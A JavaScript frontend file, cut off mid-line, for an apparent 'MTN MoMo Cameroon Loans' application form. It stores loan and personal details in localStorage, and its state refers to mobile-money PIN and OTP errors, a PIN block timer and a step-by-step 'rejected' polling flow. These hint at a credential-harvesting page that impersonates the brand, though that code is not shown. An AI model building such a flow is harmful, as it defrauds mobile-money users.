// ============================================================
// frontend/script.js – MTN MoMo Cameroon Loans Frontend
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_application_id',
    APPLICATION_DATA: 'mtn_application_data',
    REJECTION_INFO: 'mtn_rejection_info',
    FORM_DRAFT: 'mtn_form_draft',
    OTP_TIMER: 'mtn_otp_timer'
};

function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        console.log(`💾 Saved to localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to save ${key}:`, error);
    }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error(`❌ Failed to load ${key}:`, error);
        return null;
    }
}

function removeFromLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        console.log(`🗑️ Removed from localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to remove ${key}:`, error);
    }
}

// ─── Save/Load Functions ───
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
            id: id,
            timestamp: new Date().toISOString()
        });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            console.log(`🔄 Restored application ID: ${saved.id}`);
            return saved.id;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
        }
    }
    return null;
}

function saveApplicationData() {
    const dataToSave = {
        ...S,
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            const fieldsToRestore = [
                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
                'firstName', 'lastName', 'phone', 'email',
                'employment', 'annualIncome', 'kinName', 'kinPhone',
                'applicationId', 'rejectedStep'
            ];
            fieldsToRestore.forEach(field => {
                if (saved[field] !== undefined) {
                    S[field] = saved[field];
                }
            });
            console.log('🔄 Restored application data from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
        }
    }
    return false;
}

function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
        step: step,
        applicationId: applicationId,
        timestamp: new Date().toISOString()
    });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) {
            return saved;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
        }
    }
    return null;
}

function clearRejectionInfo() {
    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
}

function saveFormDraft() {
    const draft = {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
            if (draft.employment) document.getElementById('s3em').value = draft.employment;
            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            console.log('🔄 Restored form draft from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
        }
    }
    return false;
}

// ─── Navigation ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();

    if (!S.applicationId) {
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }

    document.getElementById('resendOtpBtn')?.classList.add('hidden');

    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
        clearErr(id);
    });

    goTo('page-step1');
}

// ─── Toast Notifications ───
function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = `
